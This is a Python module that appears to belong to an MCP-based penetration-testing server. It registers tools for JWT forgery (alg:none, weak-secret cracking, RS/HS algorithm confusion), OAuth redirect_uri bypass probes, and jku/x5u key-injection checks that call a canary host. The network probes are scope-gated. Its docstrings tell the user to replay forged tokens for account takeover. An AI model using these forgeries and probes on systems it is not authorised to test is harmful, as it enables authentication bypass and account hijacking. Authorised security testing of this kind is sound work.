"""Token, JWT & OAuth analysis / forgery probes.

Extracted from server.py. JWT triage + offline forgery (alg:none, weak-secret
crack, RS/HS algorithm confusion), serialization-format fingerprinting, OAuth /
OIDC discovery, redirect_uri-bypass and JWT `jku`/`x5u` key-injection (SSRF)
probes. The offline ones are pure; the network ones are scope-gated. Importing
this module registers them on the shared `mcp` instance.
"""

from __future__ import annotations

import asyncio

from .. import confirm as confirmmod
from ..context import to_dict
from ..mcp_core import (
    _collect_oast,
    _scope_check,
    active_tool,
    get_context,
    mcp,
    safe_tool,
)
from ..recon import deserialize as deserialmod
from ..web import jwt as jwtmod
from ..web import oauth as oauthmod


@mcp.tool()
@safe_tool
async def jwt_analyze(token: str) -> dict:
    """Decode a JWT (no signature verification) and flag weaknesses: alg=none,
    brute-forceable HS* secrets, missing expiry, jku/x5u/kid key-injection surface,
    and expired/not-yet-valid tokens (checked against the current time). Pure
    parsing — sends no traffic, no scope needed. Triage a token you captured.
    """

    import time

    result = jwtmod.analyze_jwt(token, now_epoch=int(time.time()))
    return to_dict(result)


@mcp.tool()
@safe_tool
async def jwt_crack(token: str, wordlist: list[str] | None = None) -> dict:
    """Offline-brute an HS256/384/512 JWT's signing secret against a weak-secret
    wordlist — a recovered secret lets you forge ANY token (critical). Also returns
    an `alg:none` forgery of the token so you can test whether the server accepts
    unsigned tokens. Pure/offline — sends no traffic, no scope needed.
    """

    secret = jwtmod.crack_hmac_secret(token, wordlist)
    return {
        "hmac_secret_found": secret is not None,
        "secret": secret,
        "severity": "critical" if secret is not None else "info",
        "alg_none_forgery": jwtmod.forge_alg_none(token),
        "note": (f"signing key {secret!r} recovered — forge any token; confirm by replaying"
                 if secret is not None
                 else "no weak secret matched; try a larger wordlist or hashcat -m 16500"),
    }


@mcp.tool()
@safe_tool
async def jwt_alg_confusion(token: str, public_key_pem: str, alg: str = "HS256") -> dict:
    """**JWT algorithm-confusion forgery.** Re-signs `token` as HS256/384/512 using the
    RSA/EC **public key's exact PEM text** as the HMAC secret — the classic
    "verifier doesn't pin the algorithm family" bug, and the highest-impact JWT
    attack after `alg:none`. If the server's JWT library accepts whatever `alg` the
    token declares and reuses the SAME key material to verify both RS*-signed and
    HS*-signed tokens, the forged token validates under the public key alone — full
    forgery without ever touching the private key. Supply `public_key_pem` (the exact
    PEM the server verifies against — fetch it from the JWKS `jwks_uri` `oauth_probe`
    reports, or a captured cert); the original header's `kid` (if any) is preserved so
    a key-by-`kid` lookup still resolves correctly. Offline — never replays the forged
    token itself; do that yourself (or via `http_repeater`) against the protected
    endpoint to confirm. No traffic, no scope needed.
    """

    try:
        forged = jwtmod.forge_alg_confusion(token, public_key_pem, alg=alg)
    except ValueError as exc:
        return {"error": "invalid_input", "detail": str(exc)}
    return {
        "forged_token": forged,
        "algorithm": alg.upper(),
        "note": ("replay this as `Authorization: Bearer <forged_token>` against a protected "
                 "endpoint — acceptance confirms alg-confusion (the verifier reused the public "
                 "key as an HMAC secret)"),
    }


@mcp.tool()
@safe_tool
async def deserialize_fingerprint(blob: str, source: str = "") -> dict:
    """**Deserialization-format fingerprint** (Freddy-lite) — 100% passive. Scans an
    already-captured value (a cookie, header, hidden form field, or body you already
    have) for the byte-level or base64 **signatures** of common object-serialization
    formats: Java native serialization (`ACED0005` / base64 `rO0AB...`), .NET
    ViewState (LosFormatter `FF01` header — also flags whether it looks encrypted vs.
    plaintext), PHP `serialize()` objects (`O:<len>:"Class":`), Python pickle
    (protocol 2-5 markers), Ruby `Marshal.dump`, and Fastjson/Jackson polymorphic
    JSON (`@type`/`@class`). Reports the format + a next-step hint (ysoserial /
    PHPGGC / ViewGen via Strix) — never invokes a gadget chain itself. Pass `source`
    (e.g. `"cookie:session"`, `"hidden-field:state"`) to note where you found it, so
    the report reminds you to confirm it's attacker-reachable. No traffic, no scope
    needed — scans data you already fetched.
    """

    hits = deserialmod.detect_markers(blob)
    return {
        "source": source or ("unspecified — confirm this value is attacker-controlled "
                             "(cookie/header/hidden field) before treating it as a lead"),
        "count": len(hits),
        "findings": [{"format": h.format, "framework": h.framework, "severity": h.severity,
                     "encoding": h.encoding, "detail": h.detail} for h in hits],
    }


@mcp.tool()
@active_tool()
async def oauth_probe(target: str) -> dict:
    """Fetch the OIDC/OAuth discovery document (`/.well-known/openid-configuration`
    or `/.well-known/oauth-authorization-server`) for an in-scope target and flag
    weak configuration: implicit grant enabled, missing/weak PKCE, `alg=none` /
    HS256 signing, plaintext-http issuer, issuer↔jwks host mix-up, public clients.
    One benign GET maps the whole auth surface (endpoints + posture).
    """

    ctx = get_context()
    raw = target.strip()
    url = raw if "://" in raw else f"https://{raw}"
    result = await oauthmod.probe_oidc(ctx.http, url, scope_check=_scope_check())
    return to_dict(result)


@mcp.tool()
@active_tool()
async def oauth_redirect_probe(target: str, client_id: str | None = None,
                               authorization_endpoint: str | None = None) -> dict:
    """**OAuth `redirect_uri` bypass chain** — a one-click-ATO class nuclei can't reason
    about. Discovers the `authorization_endpoint` (or pass `authorization_endpoint=`),
    then replays attacker `redirect_uri` variants (attacker-host, subdomain/suffix,
    `@`-host, path-traversal, backslash) at it with **redirects disabled** — a 3xx whose
    `Location` lands on the canary proves the allow-list is bypassable, so an attacker
    steals the auth code/token → account takeover. Supply a known public `client_id`
    for the strongest signal. Benign GETs; the canary is never contacted. In scope only.
    """

    ctx = get_context()
    raw = target.strip()
    url = raw if "://" in raw else f"https://{raw}"
    sc = _scope_check()
    ep = authorization_endpoint
    if not ep:
        oidc = await oauthmod.probe_oidc(ctx.http, url, scope_check=sc)
        ep = oidc.endpoints.get("authorization_endpoint")
    if not ep:
        return {"target": url, "error": "no authorization_endpoint — pass authorization_endpoint= "
                "or a base URL that serves an OIDC discovery document"}
    findings = await oauthmod.probe_redirect_uri_bypass(ctx.http, ep, client_id=client_id, scope_check=sc)
    return {
        "target": url, "authorization_endpoint": ep, "client_id": client_id,
        "vulnerable": bool(findings), "findings": findings,
        "note": ("attacker redirect_uri accepted — confirm the code/token is delivered to it (ATO)"
                 if findings else "no redirect_uri variant landed on the canary"),
    }


@mcp.tool()
@active_tool("target", intrusive=True)
async def jwt_jku_probe(token: str, target: str, header_param: str = "jku",
                        oast_token: str | None = None, wait: float = 2.0) -> dict:
    """**JWT `jku`/`x5u` key-injection (SSRF) probe.** Re-issues `token` with a `jku`
    (or `x5u`) header pointing at a MoonMCP **OAST canary**, replays it to `target` (an
    authed endpoint that verifies the JWT) as `Authorization: Bearer`, and polls for a
    callback — a callback means the server fetched attacker-controlled key material =
    key-injection / SSRF (CVE-2018-0114), a path to full token forgery. Start
    `oast_selfhost`/`oast_configure` first. **Callback-only** — never hosts a valid JWKS;
    weaponization → Strix. Intrusive; in scope only.
    """

    ctx = get_context()
    raw = target.strip()
    url = raw if "://" in raw else f"https://{raw}"
    cb = ctx.oast.get(oast_token) if oast_token else None
    if cb is None:
        if not ctx.oast.configured:
            return {"error": "oast_unconfigured",
                    "detail": "start oast_selfhost or oast_configure before probing jku/x5u SSRF"}
        cb = ctx.oast.generate(label="jwt_jku")
    param = "x5u" if header_param.lower() == "x5u" else "jku"
    try:
        forged = jwtmod.forge_remote_key_header(token, cb.http_url, param=param)
    except ValueError:
        return {"error": "invalid_token", "detail": "the supplied token is not a JWT"}
    await ctx.http.fetch(url, method="GET", headers={"Authorization": f"Bearer {forged}"},
                         follow_redirects=False, scope_check=_scope_check())
    await asyncio.sleep(max(0.0, min(wait, 5.0)))
    hits, oast_err = await _collect_oast(ctx, cb.token)
    verdict = confirmmod.evaluate(oast_count=len(hits))
    out = {"target": url, "header_param": param, "canary": cb.http_url, "token_id": cb.token,
           **verdict, "interactions": hits[:20]}
    if oast_err:
        out["oast_error"] = oast_err
        out["note"] = ("could not verify the callback channel — the OAST poll failed, so this is "
                       "NOT a clean no-hit; re-check with oast_poll")
    elif not hits:
        out["note"] = "no callback yet — the server may fetch the key later; re-check with oast_poll"
    return out
